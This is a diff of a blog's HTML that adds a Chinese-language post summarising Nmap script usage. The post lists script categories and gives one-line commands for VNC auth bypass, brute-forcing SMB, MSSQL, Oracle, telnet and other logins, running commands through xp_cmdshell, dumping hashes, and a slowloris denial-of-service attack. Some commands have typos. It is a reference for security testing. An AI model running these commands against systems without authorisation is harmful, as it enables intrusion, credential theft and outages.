@@ -286,6 +286,438 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.yuleiworld.club/2018/06/03/nmap脚本使用总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Leisurehat">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="休闲帽子">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/03/nmap脚本使用总结/" itemprop="url">nmap脚本使用总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-03T22:01:44+08:00">
+                2018-06-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,040
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Nmap脚本使用总结"><a href="#Nmap脚本使用总结" class="headerlink" title="Nmap脚本使用总结"></a>Nmap脚本使用总结</h1><hr>
+<h4 id="Nmap提供的命令行参数"><a href="#Nmap提供的命令行参数" class="headerlink" title="Nmap提供的命令行参数"></a>Nmap提供的命令行参数</h4><table>
+<thead>
+<tr>
+<th>-sC</th>
+<th style="text-align:right">等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>–script=\<lua scripts=""></lua></td>
+<td style="text-align:right">\<lua scripts="">使用某个或某类脚本进行扫描，支持通配符描述</lua></td>
+</tr>
+<tr>
+<td>–script-args=&lt;n1=v1,[n2=v2,…]&gt;</td>
+<td style="text-align:right">为脚本提供默认参数</td>
+</tr>
+<tr>
+<td>–script-args-file=filename</td>
+<td style="text-align:right">使用文件来为脚本提供参数</td>
+</tr>
+<tr>
+<td>–script-trace</td>
+<td style="text-align:right">显示脚本执行过程中发送与接收的数据</td>
+</tr>
+<tr>
+<td>–script-updatedb</td>
+<td style="text-align:right">更新脚本数据库</td>
+</tr>
+<tr>
+<td>–script-help=\<scripts></scripts></td>
+<td style="text-align:right">显示脚本的帮助信息，其中<scripts>部分可以逗号分隔的文件或脚本类别</scripts></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="Nmap按脚本分类扫描"><a href="#Nmap按脚本分类扫描" class="headerlink" title="Nmap按脚本分类扫描"></a>Nmap按脚本分类扫描</h4><ul>
+<li>nmap脚本主要分为以下几类，在扫描时可根据需要设置–script=类别这种方式进行比较笼统的扫描</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>auth</th>
+<th style="text-align:right">负责处理鉴权证书（绕开鉴权）的脚本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>broadcast</td>
+<td style="text-align:right">在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</td>
+</tr>
+<tr>
+<td>brute</td>
+<td style="text-align:right">提供暴力破解方式，针对常见的应用如http/snmp等</td>
+</tr>
+<tr>
+<td>default</td>
+<td style="text-align:right">使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</td>
+</tr>
+<tr>
+<td>discovery</td>
+<td style="text-align:right">对网络进行更多的信息，如SMB枚举、SNMP查询等</td>
+</tr>
+<tr>
+<td>dos</td>
+<td style="text-align:right">用于进行拒绝服务攻击</td>
+</tr>
+<tr>
+<td>exploit</td>
+<td style="text-align:right">利用已知的漏洞入侵系统</td>
+</tr>
+<tr>
+<td>external</td>
+<td style="text-align:right">利用第三方的数据库或资源，例如进行whois解析</td>
+</tr>
+<tr>
+<td>fuzzer</td>
+<td style="text-align:right">模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</td>
+</tr>
+<tr>
+<td>intrusive</td>
+<td style="text-align:right">入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</td>
+</tr>
+<tr>
+<td>malware</td>
+<td style="text-align:right">探测目标机是否感染了病毒、开启了后门等信息</td>
+</tr>
+<tr>
+<td>safe</td>
+<td style="text-align:right">此类与intrusive相反，属于安全性脚本</td>
+</tr>
+<tr>
+<td>version</td>
+<td style="text-align:right">负责增强服务与版本扫描（Version Detection）功能的脚本</td>
+</tr>
+<tr>
+<td>vuln</td>
+<td style="text-align:right">负责检查目标机是否有常见的漏洞（Vulnerability）</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="Nmap按应用服务扫描"><a href="#Nmap按应用服务扫描" class="headerlink" title="Nmap按应用服务扫描"></a>Nmap按应用服务扫描</h4><p>1.vnc扫描:</p>
+<hr>
+<pre><code>nmap  --script=realvnc-auth-bypass 192.168.137.4
+</code></pre><ul>
+<li>检查vnc bypass</li>
+</ul>
+<hr>
+<pre><code>nmap  --script=vnc-auth  192.168.137.4
+</code></pre><ul>
+<li>检查vnc认证方式</li>
+</ul>
+<hr>
+<pre><code>nmap  --script=vnc-info  192.168.137.4
+</code></pre><ul>
+<li>获取vnc信息</li>
+</ul>
+<hr>
+<p>2.smb扫描</p>
+<hr>
+<pre><code>nmap --script=smb-brute.nse 192.168.137.4
+</code></pre><ul>
+<li>smb破解</li>
+</ul>
+<hr>
+<pre><code>nmap  --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd192.168.137.4
+</code></pre><ul>
+<li>smb字典破解</li>
+</ul>
+<hr>
+<pre><code>nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4
+</code></pre><ul>
+<li>smb已知几个严重漏洞</li>
+</ul>
+<hr>
+<pre><code>nmap  -p 445  --script smb-ls--script-args ‘share=e$,path=\,smbuser=test,smbpass=test’
+192.168.137.4
+</code></pre><ul>
+<li>查看共享目录</li>
+</ul>
+<hr>
+<pre><code>nmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test
+192.168.137.4
+</code></pre><ul>
+<li>查询主机一些敏感信息（注：需要下载nmap_service）</li>
+</ul>
+<hr>
+<pre><code>nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=test,smbpass=test
+192.168.137.4
+</code></pre><ul>
+<li>查看会话</li>
+</ul>
+<hr>
+<pre><code>nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=test
+192.168.137.4
+</code></pre><ul>
+<li>系统信息</li>
+</ul>
+<hr>
+<p>3.Mssql扫描</p>
+<hr>
+<pre><code>nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd
+192.168.137.4
+</code></pre><ul>
+<li>猜解mssql用户名和密码</li>
+</ul>
+<hr>
+<pre><code>nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password
+=sa,ms-sql-xp-cmdshell.cmd=&quot;netuser&quot; 192.168.137.4
+</code></pre><ul>
+<li>xp_cmdshell 执行命令</li>
+</ul>
+<hr>
+<pre><code>nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password
+=sa  192.168.137.4
+</code></pre><ul>
+<li>dumphash值</li>
+</ul>
+<hr>
+<p>4.Mysql扫描</p>
+<hr>
+<pre><code>nmap -p3306 --script=mysql-empty-password.nse 192.168.137.4
+</code></pre><ul>
+<li>扫描root空口令</li>
+</ul>
+<hr>
+<pre><code>nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4
+</code></pre><ul>
+<li>列出所有mysql用户</li>
+</ul>
+<hr>
+<pre><code>nmap --script=mysql-* 192.168.137.4
+</code></pre><ul>
+<li>支持同一应用的所有脚本扫描</li>
+</ul>
+<hr>
+<p>5.oracle扫描</p>
+<hr>
+<pre><code>nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5
+</code></pre><ul>
+<li>oracle sid扫描</li>
+</ul>
+<hr>
+<pre><code>nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb
+=/var/passwd192.168.137.5
+</code></pre><ul>
+<li>oracle弱口令破解</li>
+</ul>
+<hr>
+<p>6.其他一些比较好用的脚本</p>
+<hr>
+<table>
+<thead>
+<tr>
+<th>nmap –script=broadcast-netbios-master-browser 192.168.137.4</th>
+<th style="text-align:right">发现网关</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.137.4</td>
+<td style="text-align:right">破解rsync</td>
+</tr>
+<tr>
+<td>nmap –script informix-brute -p 9088 192.168.137.4</td>
+<td style="text-align:right">informix数据库破解</td>
+</tr>
+<tr>
+<td>nmap -p 5432 –script pgsql-brute 192.168.137.4</td>
+<td style="text-align:right">pgsql破解</td>
+</tr>
+<tr>
+<td>nmap -sU –script snmp-brute 192.168.137.4</td>
+<td style="text-align:right">snmp破解</td>
+</tr>
+<tr>
+<td>nmap -sV –script=telnet-brute 192.168.137.4</td>
+<td style="text-align:right">telnet破解</td>
+</tr>
+<tr>
+<td>nmap –script=http-vuln-cve2010-0738 –script-args ‘http-vuln-cve2010-0738.paths={/path1/,/path2/}’ <target>  jboss autopwn</target></td>
+</tr>
+</tbody>
+</table>
+<p>nmap –script=http-methods.nse 192.168.137.4|检查http方法|<br>|nmap –script http-slowloris –max-parallelism 400 192.168.137.4|dos攻击，对于处理能力较小的站点还挺好用的 ‘half-HTTP’ connections|</p>
+<hr>
+<p>7.不靠谱的脚本</p>
+<hr>
+<ul>
+<li><p>vnc-brute : 次数多了会禁止连接</p>
+</li>
+<li><p>pcanywhere-brute : 同上</p>
+</li>
+</ul>
+<hr>
+
+          
+        
+      
+    </div>
+    
+    
+    
+	
+	
+	<div>
+      
+	</div>
+	
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.yuleiworld.club/2018/05/29/netcat使用心得/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -567,7 +999,7 @@ nc -lp 80
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -658,7 +1090,7 @@ nc -lp 80
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">439</span>
+    <span title="Site words total count">1.5k</span>
   
 </div>
 <div class="powered-by">
@@ -681,7 +1113,7 @@ nc -lp 80
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共439字</span>
+  <span class="post-count">博客全站共1.5k字</span>
 </div>
         
 
